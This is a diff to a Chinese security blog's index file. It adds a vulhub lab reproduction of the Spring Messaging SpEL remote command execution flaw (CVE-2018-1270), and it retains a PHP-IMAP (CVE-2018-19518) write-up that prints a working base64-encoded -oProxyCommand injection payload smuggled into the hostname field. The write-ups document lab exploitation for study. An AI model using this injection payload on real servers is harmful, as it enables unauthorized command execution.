@@ -4,6 +4,41 @@
   
     
     <entry>
+      <title>Spring-Messaging远程命令执行漏洞(CVE-2018-1270)</title>
+      <link href="/2022/05/07/Spring-Messaging/"/>
+      <url>/2022/05/07/Spring-Messaging/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Spring-Messaging远程命令执行漏洞"><a href="#Spring-Messaging远程命令执行漏洞" class="headerlink" title="Spring-Messaging远程命令执行漏洞"></a>Spring-Messaging远程命令执行漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>spring messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS，</p><p>在spring messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用<code>StandardEvaluationContext</code>解析，造成命令执行漏洞。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>Spring Framework 5.0 - 5.0.4.<br>Spring Framework 4.3 - 4.3.14<br>已不支持的旧版本仍然受影响</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2018-1270docker-compose up -d</code></pre><h2 id="复现测试"><a href="#复现测试" class="headerlink" title="复现测试"></a>复现测试</h2><p>先访问<code>http://192.168.3.151:8080</code></p><p>使用官方的POC</p><p><code>https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py</code></p><p>修改一下</p><pre class=" language-python"><code class="language-python">sockjs <span class="token operator">=</span> SockJS<span class="token punctuation">(</span><span class="token string">'http://192.168.3.151:8080/gs-guide-websocket'</span><span class="token punctuation">)</span></code></pre><p><img src="/2022/05/07/Spring-Messaging/image-20220507092251940.png" alt="image-20220507092251940"></p><p>进入docker容器</p><pre class=" language-Linux"><code class="language-Linux">docker exec -it cve-2018-1270 bashcd /tmpls</code></pre><p><img src="/2022/05/07/Spring-Messaging/image-20220507092403941.png" alt="image-20220507092403941"></p><p>结束！！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> CVE </tag>
+            
+            <tag> vulhub </tag>
+            
+            <tag> Spring </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Spring Data Rest远程命令执行漏洞(CVE-2017-8046)</title>
       <link href="/2022/05/06/Spring-Data-Rest/"/>
       <url>/2022/05/06/Spring-Data-Rest/</url>
@@ -27,6 +62,8 @@
             <tag> 网络安全 </tag>
             
             <tag> CVE </tag>
+            
+            <tag> vulhub </tag>
             
             <tag> Spring </tag>
             
@@ -61,6 +98,8 @@
             
             <tag> CVE </tag>
             
+            <tag> vulhub </tag>
+            
             <tag> Spring </tag>
             
         </tags>
@@ -93,6 +132,8 @@
             <tag> 网络安全 </tag>
             
             <tag> CVE </tag>
+            
+            <tag> vulhub </tag>
             
             <tag> Spring </tag>
             
@@ -241,7 +282,7 @@
       <link href="/2022/05/05/php-imap/"/>
       <url>/2022/05/05/php-imap/</url>
       
-        <content type="html"><![CDATA[<h1 id="PHP-IMAP命令执行漏洞"><a href="#PHP-IMAP命令执行漏洞" class="headerlink" title="PHP-IMAP命令执行漏洞"></a>PHP-IMAP命令执行漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>php imap扩展用于在PHP中执行邮件收发操作。其<code>imap_open</code>函数会调用rsh来连接远程shell，而debian&#x2F;ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。</p><p>因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>PHP:5.6.38</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/php/CVE-2018-19518docker-compose up -d</code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>访问网站并用burpsuite抓包</p><p><img src="/2022/05/05/php-imap/image-20220505172121646.png" alt="image-20220505172121646"></p><p>将<code>echo &#39;654321&#39;&gt;/tmp/123456</code>，base64编码</p><p>构造payload</p><pre><code>hostname=a -oProxyCommand=echo echo &#39;654321&#39;&gt;/tmp/123456|base64 -d|sh&#125;&amp;username=2&amp;password=3hostname=a+-oProxyCommand%3decho%09ZWNobyAnNjU0MzIxJz4vdG1wLzEyMzQ1Ng%3d%3d|base64%09-d|sh&#125;&amp;username=2&amp;password=3</code></pre><p><img src="/2022/05/05/php-imap/image-20220505172856723.png" alt="image-20220505172856723"></p><p>看看有没有执行成功</p><p>进入容器</p><pre class=" language-Linux"><code class="language-Linux">docker-compose exec web bash</code></pre><p>查看</p><p><img src="/2022/05/05/php-imap/image-20220505183135012.png" alt="image-20220505183135012"></p><p>成功！</p>]]></content>
+        <content type="html"><![CDATA[<h1 id="PHP-IMAP命令执行漏洞"><a href="#PHP-IMAP命令执行漏洞" class="headerlink" title="PHP-IMAP命令执行漏洞"></a>PHP-IMAP命令执行漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>php imap扩展用于在PHP中执行邮件收发操作。其<code>imap_open</code>函数会调用rsh来连接远程shell，而debian&#x2F;ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。</p><p>因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>PHP:5.6.38</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/php/CVE-2018-19518docker-compose up -d</code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>访问网站并用burpsuite抓包</p><p><img src="/2022/05/05/php-imap/image-20220505172121646.png" alt="image-20220505172121646"></p><p>将<code>echo &#39;654321&#39;&gt;/tmp/123456</code>，base64编码</p><p>构造payload</p><pre><code>hostname=a -oProxyCommand=echo echo &#39;654321&#39;&gt;/tmp/123456|base64 -d|sh&#125;&amp;username=2&amp;password=3hostname=a+-oProxyCommand%3decho%09ZWNobyAnNjU0MzIxJz4vdG1wLzEyMzQ1Ng%3d%3d|base64%09-d|sh&#125;&amp;username=2&amp;password=3</code></pre><p><img src="/2022/05/05/php-imap/image-20220505172856723.png" alt="image-20220505172856723"></p><p>看看有没有执行成功</p><p>进入docker容器</p><pre class=" language-Linux"><code class="language-Linux">docker-compose exec web bash</code></pre><p>查看</p><p><img src="/2022/05/05/php-imap/image-20220505183135012.png" alt="image-20220505183135012"></p><p>成功！</p>]]></content>
       
       
       <categories>
